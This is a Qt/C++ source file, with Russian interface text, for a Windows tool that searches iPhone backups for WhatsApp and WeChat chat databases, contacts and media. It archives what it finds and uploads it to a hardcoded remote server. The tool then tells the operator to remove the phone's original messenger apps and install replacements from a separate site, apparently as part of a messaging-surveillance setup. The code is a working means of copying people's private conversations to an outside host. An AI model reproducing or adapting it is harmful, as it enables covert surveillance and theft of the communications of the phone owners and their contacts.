#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "QDir"
#include "QDebug"
#include "QFileDialog"
#include "QMessageBox"

//#define TEST

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

   setBackUpRootPath();
   showAllBackups();
   logTextBrowser = ui->logTextBrowser;
   logTextBrowser->append("1. Загрузите файс с номером задания");
   ui->startBtn->setEnabled(false);
   WHATSAPP_DB_FILENAME = "ChatStorage.sqlite";
   WHATSAPP_MEDIA_ZIP_FILENAME = "wmedia.zip";
   WHATSAPP_MEDIA_ZIP_POST_NAME = "wzipfile";
   WHATSAPP_DB_POST_NAME = "wdbfile";
   IPA_BUILDER_MAC_SERVER_IP = "http://88.204.154.151";
   INSTALL_URL = "https://xargon.ru/install";

   WECHAT_DB_FILE = "wechat_dbfile.zip";
   WECHAT_POST_NAME = "wechat_zip";



   //instructionForm.setUrl("http://88.204.154.151");
    // instructionForm.show();



    //runTest();

}

MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::showAllBackups(){

    QDir backupDir(pathToAllBackup);
    QStringList list =  backupDir.entryList();

    foreach(QString dirName,list){
        if(dirName == "." || dirName == ".."){
            list.removeOne(dirName);
            continue;
        }
        qDebug() << "dirName:" << dirName;
    }

   ui->backupsListComBox->addItems(list);


}

void MainWindow::setBackUpRootPath(){

    pathToAllBackup = QString("%1/AppData/Roaming/Apple Computer/MobileSync/Backup").arg(QDir::homePath());

}

void MainWindow::runTest(){



}

void MainWindow::on_startBtn_clicked()
{

    //ui->startBtn->setText("Ждите...");
    ui->startBtn->setEnabled(false);
    logTextBrowser->append("\nОбработка бэкапа.........");

     setUpdatesEnabled(true);
     repaint();
     //setUpdatesEnabled(false);


    QString manifestPath = QString("%1/%2/%3").arg(pathToAllBackup,ui->backupsListComBox->currentText(), "Manifest.db" );
     connectDatabase(manifestPath);

    UUID = ui->backupsListComBox->currentText();

    if(UUID.isEmpty()){
        ui->startBtn->setEnabled(true);
        ui->backupsListComBox->setStyleSheet("QComboBox { border-style: outset;border-width: 1px; border-color: red; }");
        QMessageBox msgBox;
        msgBox.setText("Введите UUID устройства");
        msgBox.exec();
        return;

    }

    ui->backupsListComBox->setStyleSheet("QComboBox { border-style: outset;border-width: 1px; border-color: black; }");


     QMap <QString, QString> *mapPostAndFilePaths =new QMap<QString, QString>();

     //clear all tmpDir
     clear();



     if(ui->whatsappAppcheckBox->isChecked()){
         logTextBrowser->append("\nИдет Обработка файлов для мессенджера Whatsapp.........");
          repaint();
         QString zipPath =  processWhatsappBackup(manifestPath);
         if(!zipPath.isEmpty()){
             //add ChatStrorage.sqlite
             mapPostAndFilePaths->insert(WHATSAPP_MEDIA_ZIP_POST_NAME,zipPath);

             //add ChatStrorage.sqlite
             QString dbFileNameFullPath = zipPath;
             dbFileNameFullPath.replace(WHATSAPP_MEDIA_ZIP_FILENAME, WHATSAPP_DB_FILENAME);
             mapPostAndFilePaths->insert(WHATSAPP_DB_POST_NAME,dbFileNameFullPath);

         }

     }


     if(ui->WechatAppCheckBox->isChecked()){
         logTextBrowser->append("\nИдет Обработка файлов для мессенджера Wechat.........");
          repaint();
         QString zipPath =  processWechatBackup(manifestPath);
         if(!zipPath.isEmpty()){
             mapPostAndFilePaths->insert(WECHAT_POST_NAME,zipPath);
         }
     }

     if(ui->ViberAppCheckBox->isChecked()){
         logTextBrowser->append("\nИдет Обработка файлов для мессенджера VIBER.........");

     }

  sendAllBackup(mapPostAndFilePaths, UUID);

}

QString MainWindow::processWhatsappBackup (QString backupFullPath){

     //move ChatStorage.sqlite path
     logTextBrowser->append("\nИдет Обработка файлов для мессенджера Whatsapp.........");
     logTextBrowser->append("\nИдет копирование базы данных Whatsapp .........");
     QString ChatStorageCopiedPath = copyStorageFile();

     if(ChatStorageCopiedPath.isEmpty()){

         return "";
     }

     // move media files
     logTextBrowser->append("\nКопирование медиа файлов в временную директорию.........");
     QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
     QString sqlQuery = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
     getMediaFilesPaths(mapIosPathAndLocalPath, sqlQuery);
     QString libraryWordForCut = "Library/";

     if(mapIosPathAndLocalPath->count() > 0) {
         copyFilesToTmpDir(mapIosPathAndLocalPath, libraryWordForCut.length());
         //zip file for whatsapp
         logTextBrowser->append("\nСоздание архива медиафайлов Whatsapp .........\n");
         QString zippedPath = zip(WHATSAPP_MEDIA_ZIP_FILENAME);
         if(zippedPath.isEmpty()){
             qDebug() << "faild zip file";
         }
         return zippedPath;

     }

     else
         return "";


}


QString MainWindow::processWechatBackup(QString backupFullPath){

    QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
    //QString sqlQuery = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
    //QString sqlQuery = "select * from Files where relativePath  LIKE \"%MM.sqlite\" AND domain = \"AppDomain-com.tencent.xin\"";
    QString sqlQuery  = "select * from Files where domain = \"AppDomain-com.tencent.xin\" "
                        "AND ("
                        "(relativePath  LIKE \"%MM.sqlite\") "
                        "or (relativePath  LIKE \"%WCDB_Contact.sqlite\")"
                        "or (relativePath LIKE \"%Audio%\" AND flags = 1)"
                        " or (relativePath LIKE \"%Video%\"  AND flags = 1) "
                        "or (relativePath LIKE \"%Img%\" AND flags = 1 )"
                        ")";



    getMediaFilesPaths(mapIosPathAndLocalPath, sqlQuery);

    QString libraryWordForCut = "Documents/";

    if(mapIosPathAndLocalPath->count() > 0){
        copyFilesToTmpDir(mapIosPathAndLocalPath, libraryWordForCut.length());
        QString zippedPath = zip(WECHAT_DB_FILE);
        if(zippedPath.isEmpty()){
            qDebug() << "faild zip wechat db file";
        }
        qDebug() << "Success zip wechat db file";
        return zippedPath;

    }

    else
        return "";

//select * from Files
//where domain = "AppDomain-com.tencent.xin"
//AND ((relativePath  LIKE "%MM.sqlite")
//or (relativePath LIKE "%Audio%" AND flags = 1)
//or (relativePath LIKE "%Video%"  AND flags = 1)
//or (relativePath LIKE "%Img%" AND flags = 1 ))

}

bool MainWindow::connectDatabase(const QString& database)
{

     db =  QSqlDatabase::addDatabase("QSQLITE");
     db.setDatabaseName(database);

    bool  res = db.open();
     if (!res){
         qDebug() << "database not opened";
         return false;
     }
     else{
         qDebug() << "database sucsses opened";
         logTextBrowser->append("Манифест файл успешно считался");
        // db.close();

     }
     return true;
}


QString MainWindow::copyStorageFile(){

    QString copiedStoragePath = "";

    QSqlQuery query(db);
    QString cmd = "select * from files where relativePath = 'ChatStorage.sqlite'";

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return "";
    }

    if(query.next())
    {
         QString hash = query.value(0).toString();
         QString iosFileName = query.value(2).toString();
         currentBackup = QString("%1/%2").arg(pathToAllBackup,ui->backupsListComBox->currentText() );
         QDirIterator dirIter(currentBackup, QStringList() << hash, QDir::Files, QDirIterator::Subdirectories);
         if(dirIter.hasNext()){
             QString localPath = dirIter.next();
             //copy
             QString tempDirPath = getBackupTmpDirFullPath();
             if(tempDirPath.isEmpty()){
                 qDebug() << "faild create tmpDir";
                  return "";
             }
             QString srcFilePAth = localPath;
             QString dstFilePath = QString("%1/%2").arg(tempDirPath,iosFileName );
             QFile file;
             bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

            if(!isCopiedSuccess){
                qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
                 return "";
            }

            else{
                return dstFilePath;
            }
         }

         return "";
    }

    else
        return "";



}


bool MainWindow::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocalPath,  QString sqlIn){
    //1 Get media files paths
    QSqlQuery query(db);
   // QString cmd = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
   QString cmd = sqlIn;

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return false;
    }

    QMap <QString, QString> mapHashPath;

    int countRowInDb = 0;
    while(query.next())
    {
        QString hash = query.value(0).toString();
        QString pathInIOS = query.value(2).toString();
        mapHashPath.insert(hash,pathInIOS);
        countRowInDb++;
    }


    currentBackup = QString("%1/%2").arg(pathToAllBackup,ui->backupsListComBox->currentText() );
    QMapIterator<QString, QString> iter(mapHashPath);
    qint64 countFind = 0;
    while (iter.hasNext()) {
        iter.next();
        qDebug() << iter.key() << ": " << iter.value() << endl;
        QDirIterator dirIter(currentBackup, QStringList() << iter.key(), QDir::Files, QDirIterator::Subdirectories);
        while(dirIter.hasNext()){
            mapIosPathAndLocalPath->insert(iter.value(),dirIter.next() );
        }

        qDebug() << "count of find loop:" << countFind;
        qDebug() << "current size of finded map is:" << mapIosPathAndLocalPath->count();
        countFind++;

        //for test
#ifdef TEST
        if(countFind > 5){
            break;
        }
#endif
    }

    qDebug() << "Finished Count of finded files is:" << mapIosPathAndLocalPath->count();
    return true;
}

bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalPath, int lenghForCut){

    // get tmp dir

    QString tempDirPath = getBackupTmpDirFullPath();
    if(tempDirPath.isEmpty()){
        qDebug() << "faild create tmpDir";
        return false;
    }

    QMapIterator<QString, QString> iter(*mapIosPathAndLocalPath);

    while (iter.hasNext()) {

        iter.next();
        //Library/Media/77017213945-1409280046@g.us/2/2/220f0a3e-a074-4ade-b2f2-2631be0f5a11.thumb
        QString iosPath  = iter.key();

        //"C:/Users/Admin/AppData/Roaming/Apple Computer/MobileSync/Backup/1b5b94b83e762264209e8482ff965434f0dcd1ab/00/0095d94891ca2b7c2754fe234854b2e34807b57a"
        QString localPath = iter.value();

        qDebug() << iosPath << ":" << localPath;

        //cut from iosPath Library/
        QString fileName = QFileInfo(iosPath).fileName();
        iosPath = iosPath.remove(0,lenghForCut);
        iosPath = iosPath.replace(fileName, "");

        QString pathWithAllDirs = QString("%1/%2").arg(tempDirPath,iosPath );

        QDir dirForMedia(pathWithAllDirs);

        if(!dirForMedia.exists()){
            bool succes = dirForMedia.mkpath(pathWithAllDirs);
            if(!succes){
                qDebug() << "faild to create folder with path:" << pathWithAllDirs;
            }
        }

        //copy
        QString srcFilePAth = localPath;
        QString dstFilePath = QString("%1/%2").arg(pathWithAllDirs,fileName );

        QFile file;

       bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

       if(!isCopiedSuccess){
           qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
       }

    }

    return true;

}

QString MainWindow::zip(QString zipFileName){

    //"%ProgamFiles%\WinRAR\Rar.exe" a -ep1 -r "Name of ZIP file with path" "%UserProfile%\Desktop\someFolder"
   // rar a backup @backup.lst

    QProcess* zipProc = new QProcess(this);
    QString cmd = getWinRarExePath();
    if (cmd.isEmpty()){
        qDebug() << "faild get rar.exe path";
        return "";
    }

    QString zippedFileName = QString("%1/%2").arg(getBackupTmpDirFullPath(),zipFileName);
//"C:\Program Files\WinRAR\WinRAR.exe" a -afzip -ep1 C:/Users/vohulg/AppData/Local/Temp/e9bdd3562cdccb727e7d41a7051f2b2880388aa8/wmedia.zip @C:/Users/vohulg/AppData/Local/Temp/e9bdd3562cdccb727e7d41a7051f2b2880388aa8.lst
    QStringList argZip;
    argZip << "a" << "-afzip" << "-ep1" << zippedFileName << QString("@%1").arg(getLstFile());
    zipProc->start(cmd, argZip);

    if (!zipProc->waitForFinished())
        return "";

    QByteArray zipResult = zipProc->readAll();

    qDebug() << "zip result:" << zipResult;

    return zippedFileName;

}

QString MainWindow::getLstFile(){

    QString lstFilePath =  QString("%1/%2.lst").arg(QDir::tempPath(),UUID);
    QFile fileLst(lstFilePath);
    if (!fileLst.open(QIODevice::WriteOnly)){
        return "";
    }
    QTextStream out(&fileLst);
       // out << "The magic number is: " << 49 << "\n";


    QDir backupDir(getBackupTmpDirFullPath());
    QStringList list =  backupDir.entryList();

    foreach(QString dirName,list){
        if(dirName == "." || dirName == ".."){
            continue;
        }

        //write to lst file
        QString fullPath = QString("%1/%2").arg(getBackupTmpDirFullPath(), dirName);
        if(fullPath.contains(WHATSAPP_DB_FILENAME)){
            continue;
        }
        out << fullPath << "\n";

    }

    fileLst.close();
    return lstFilePath;




}

bool MainWindow::clear(){

    QString lstFile = QString("%1/%2.lst").arg(QDir::tempPath(), UUID);
    if (QFile::exists(lstFile)){
        QFile::remove(lstFile);
    }

    QString tmpDirForUUID = QString("%1/%2").arg(QDir::tempPath(), UUID);
    QDir dir;
    if (dir.exists(tmpDirForUUID)){
        QDir dirForRemove(tmpDirForUUID);
        dirForRemove.removeRecursively();
    }

    return true;
}

QString  MainWindow::getWinRarExePath(){

    //QString winrarExe = "C:\\Program Files\\WinRAR\\Rar.exe";
QString winrarExe = "C:\\Program Files\\WinRAR\\WinRAR.exe";

    QFile file(winrarExe);

    if(file.exists()){

        return winrarExe;
    }
    else{
        return "";
    }

}

QString MainWindow::getBackupTmpDirFullPath (){

    QString tempDirPath = QString("%1/%2").arg(QDir::tempPath(), UUID);
    QDir tmpDir(tempDirPath);

    if(!tmpDir.exists()){
        bool isSuccess = tmpDir.mkdir(tempDirPath);
        if(!isSuccess){
            qDebug() << "faild create temp folder at path" << tempDirPath;
           return "";
        }

    }

    return tempDirPath;

}

QString MainWindow::getNameFromFullPath(QString fullPath){

    QFile file(fullPath);
    QString str = file.fileName();
    QStringList parts = str.split("/");
    QString lastSection = parts.at(parts.size()-1);
    return lastSection;

}

QByteArray MainWindow::getAppList(){

    QStringList appList;

    if(ui->whatsappAppcheckBox->isChecked()){
        appList << "w";
    }

    if(ui->TelegramAppCheckBox->isChecked()){
        appList << "t";
    }

    if(ui->WechatAppCheckBox->isChecked()){
        appList << "c";
    }

    if(ui->ViberAppCheckBox->isChecked()){
        appList << "v";
    }

   QByteArray appListBuf =  appList.join(",").toUtf8();

   return appListBuf;
}

bool MainWindow::sendAllBackup (QMap <QString, QString>* mapPostAndFilePath, QString uuid) {

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);

    QByteArray  paramTextPlain="text/plain";
    QByteArray  paramOctetStream="application/octet-stream";

    QByteArray paramUuidName="uuid" ,paramUuidValue=uuid.toUtf8();
    QByteArray paramGuidName="guid" ,paramGuidValue=GuidByteArr;
    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
     QByteArray paramNameApplist="applist" ,paramAppListValue=getAppList();
    //задаем разделитель
    QByteArray postData,boundary="-----------------------1BEF0A57BE110FD467A";

    // параметр uuid
    postData.append("--"+boundary+"\r\n");//разделитель
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramUuidName);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramUuidValue);
    postData.append("\r\n");

    // параметр guid
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramGuidName);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramGuidValue);
    postData.append("\r\n");

    // параметр url
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramNameUrl);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramUrlValue);
    postData.append("\r\n");

    // параметр applist
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramNameApplist);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramAppListValue);
    postData.append("\r\n");


    //attach files
    QMapIterator<QString, QString> iter(*mapPostAndFilePath);
    while (iter.hasNext()) {

        iter.next();
        QString postValue  = iter.key();
        QString filePath = iter.value();
        QString fileName = getNameFromFullPath(filePath);

        QFile file(filePath);
        if (!file.open(QIODevice::ReadWrite)){
            logTextBrowser->append(QString(" Не найден файл с архивом: %1 ").arg(filePath));
            continue;
        }

        QByteArray paramAttachName=postValue.toUtf8(), paramAttachFileName=fileName.toUtf8();
        QByteArray paramAttachData=file.readAll();


        //параметр приаттаченный файл
        postData.append("--"+boundary+"\r\n");//разделитель
        //имя параметра
        postData.append("Content-Disposition: form-data; name=\"");
        postData.append(paramAttachName);
        //имя файла
        postData.append("\"; filename=\"");
        postData.append(paramAttachFileName);
        postData.append("\"\r\n");
        //тип содержимого файла
        postData.append("Content-Type: "+paramOctetStream+"\r\n\r\n");
        //данные
        postData.append(paramAttachData);
        postData.append("\r\n");
    }


    //"хвост" запроса
    postData.append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData.length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
     //connect(manager, SIGNAL(),this, SLOT();

    logTextBrowser->append("Идет отправка архива на сервер......");
    QNetworkReply *reply=manager->post(request,postData);
    return true;
}

bool MainWindow::sendZip (QString zipFullPath, QString uuid){

    QString fileName = getNameFromFullPath(zipFullPath);

    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite)){
        logTextBrowser->append(QString(" Не найден файл с медиа архивом: %1 ").arg(zipFullPath));
        return false;
    }

    QString dbFileNameFullPath = zipFullPath;
    QString dbFileName = WHATSAPP_DB_FILENAME;
    dbFileNameFullPath.replace(WHATSAPP_MEDIA_ZIP_FILENAME, WHATSAPP_DB_FILENAME);

    QFile dbFileFd(dbFileNameFullPath);
    if (!dbFileFd.open(QIODevice::ReadWrite)){
        logTextBrowser->append(QString(" Не найден файл с  архивом базы данных : %1 ").arg(dbFileNameFullPath));
        return false;
    }

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);;
    //параметр 1 - uuid, параметр 2 - файл параметр 3 - guid
    QByteArray param1Name="uuid" ,param1Value=uuid.toUtf8();
    QByteArray  param1ContentType="text/plain";

    QByteArray param3Name="guid" ,param3Value=GuidByteArr;
    QByteArray  param3ContentType="text/plain";

    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
    QByteArray  paramUrlContentType="text/plain";

    QByteArray param2Name=WHATSAPP_MEDIA_ZIP_POST_NAME.toUtf8(), param2FileName=fileName.toUtf8();
    QByteArray  param2ContentType="application/octet-stream";
    QByteArray param2Data=file.readAll();

    QByteArray param4Name=WHATSAPP_DB_POST_NAME.toUtf8(), param4FileName=dbFileName.toUtf8();
    QByteArray  param4ContentType="application/octet-stream";
    QByteArray param4Data=dbFileFd.readAll();

    //задаем разделитель
    QByteArray postData,boundary="-----------------------1BEF0A57BE110FD467A";

    // параметр uuid
    postData.append("--"+boundary+"\r\n");//разделитель
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param1Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param1Value);
    postData.append("\r\n");

    // параметр guid
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param3Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param3Value);
    postData.append("\r\n");

    // параметр url
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramNameUrl);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramUrlValue);
    postData.append("\r\n");

    //параметр 2 - файл
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param2Name);
    //имя файла
    postData.append("\"; filename=\"");
    postData.append(param2FileName);
    postData.append("\"\r\n");
    //тип содержимого файла
    postData.append("Content-Type: "+param2ContentType+"\r\n\r\n");
    //данные
    postData.append(param2Data);
    postData.append("\r\n");

    //параметр 4 - файл базы данных
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param4Name);
    //имя файла
    postData.append("\"; filename=\"");
    postData.append(param4FileName);
    postData.append("\"\r\n");
    //тип содержимого файла
    postData.append("Content-Type: "+param4ContentType+"\r\n\r\n");
    //данные
    postData.append(param4Data);
    postData.append("\r\n");


    //"хвост" запроса
    postData.append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData.length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
     //connect(manager, SIGNAL(),this, SLOT();

    logTextBrowser->append("Идет отправка архива на сервер......");
    QNetworkReply *reply=manager->post(request,postData);


    return true;
}

void MainWindow::sendReportToServerReply(QNetworkReply* reply){

     ui->startBtn->setEnabled(true);

     QByteArray replyInByte = reply->readAll();
     qint64 size = replyInByte.size();

      if(replyInByte.size() < SIZE_UNIQ_URL || replyInByte.contains("ERROR")){
          logTextBrowser->append("Ошибка в передаче архива на сервер:");
          logTextBrowser->append(QString::fromLatin1(replyInByte));
          return;
     }

     QString replyStr = QString::fromLatin1(replyInByte);
     QString log = QString("\nДля установки программ на телефон сначала удалите оригинальные приложения затем откройте браузер на телефоне и перейдите по ссылки %1/%2 \n").arg(INSTALL_URL,replyStr);
     logTextBrowser->append(log);

     QString url = QString("%1/%2").arg(INSTALL_URL,replyStr);
     instructionForm.setUrl(url);
     instructionForm.show();

     // сохранение UUID в файл на рабочем столе и отправка на почту
     QString fullPath = QString("%1/Desktop/%2.log").arg(QDir::homePath(), UUID);
     QDateTime currentDT =  QDateTime::currentDateTime();
     QString dateTimeStr = currentDT.toString("dd.MM.yyyy_hh.mm.ss");
     QString pathWithDate = QString("%1_%2").arg(fullPath,dateTimeStr);
     bool successSave = saveLog(pathWithDate);

     if (successSave) {
         logTextBrowser->append(QString("\n\n Логи сохранены в файле %1 \n\n ").arg(pathWithDate));
     }
     else {
         logTextBrowser->append(QString("\n\n Ошибка при сохранении логов в файл по пути %1 \n\n").arg(pathWithDate));
     }



 }

void MainWindow::sendPost(){

    //QUrl serviceUrl = QUrl("http://myserver/myservice.asmx");
     QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
     QByteArray postData;
     postData.append("uuid=925dsfh90325793fdsif0932878fdoisf");

      /*
      Setup the post data somehow
      I want to transmit:
      param1=string,
      param2=string
      */

       // Call the webservice
       QNetworkAccessManager *networkManager = new QNetworkAccessManager(this);
       connect(networkManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(sendReportToServerReply(QNetworkReply*)));
       networkManager->post(request, postData);
}

void  MainWindow::sendMultiPart(){

   // QString zipFile = "C:\\Users\\vohulg\\AppData\\Local\\Temp\\6f3f394f07f8edd922b701fc3db69ede00bb5360\\whatsapp.zip";
    QString zipFile = "C:\\Users\\vohulg\\AppData\\Local\\Temp\\6f3f394f07f8edd922b701fc3db69ede00bb5360\\Samples.cpp";


    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
        QHttpPart imagePart;
        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"wzipfile\"; filename=\"sample\""));/* version.tkt is the name on my Disk of the file that I want to upload */

        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
        textPart.setBody("92874fhdsfh932744545454rwyri");/* toto is the name I give to my file in the server */

        QFile *file = new QFile(zipFile);
        file->open(QIODevice::ReadOnly);
        imagePart.setBodyDevice(file);
        file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart

        multiPart->append(textPart);
        multiPart->append(imagePart);

       QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));

        QNetworkAccessManager *networkManager= new QNetworkAccessManager;
        networkManager->post(request, multiPart);
       // multiPart->setParent(reply); // delete the multiPart with the reply


}


bool MainWindow::saveLog(QString fileFullPath){

    QFile fileLog(fileFullPath);
    if (!fileLog.open(QIODevice::WriteOnly)){
        return false;
    }
    QTextStream out(&fileLog);
    out << "UUID:" << UUID << "\n";

    //write log info
    QTextDocument *doc = logTextBrowser->document();
    QString logText = doc->toPlainText();

    out << "LOG: \n" << logText.toUtf8();

    return true;



}

//set guid from file
void MainWindow::on_chooseFileBtn_clicked()
{
     ui->startBtn->setEnabled(false);
     GuidByteArr = NULL;
     URLByteArr = NULL;


        QString filter = "Any files (*)";
       QString* selecFilter = &filter;
       QString fileWithGuid = QFileDialog::getOpenFileName(this, tr("Open image file"), tr("/"), filter, selecFilter, QFileDialog::DontConfirmOverwrite );

       QFile fileGuid(fileWithGuid);
       if (!fileGuid.open(QIODevice::ReadOnly)){
           QMessageBox::critical(this, "Error", "File not exist");
           return ;
       }

       fileGuid.readLine();// read alias, not used

        //get url
       URLByteArr = fileGuid.readLine().trimmed();
       if(URLByteArr.length() < 5 || !URLByteArr.contains("http")){
           saveLog("Url data not match");
           QMessageBox::critical(this, "Error", "Url data not match");
           return ;
       }

       //get guid
       #define GUID_LEN 36
       GuidByteArr = fileGuid.readLine().trimmed();
       if(GuidByteArr.length() != GUID_LEN){
           saveLog("Guid data not match");
           QMessageBox::critical(this, "Error", "Guid data not match");
           return ;
       }

       logTextBrowser->append("Guid success downloaded!");
       saveLog("2.Guid успешно загружен!");
       logTextBrowser->append("3. Выберите идентификатор бэкапа и нажмите старт");
       ui->guidLine->setText(GuidByteArr);
       ui->startBtn->setEnabled(true);\

}

void MainWindow::on_action_triggered()
{
    instructionForm.show();
}



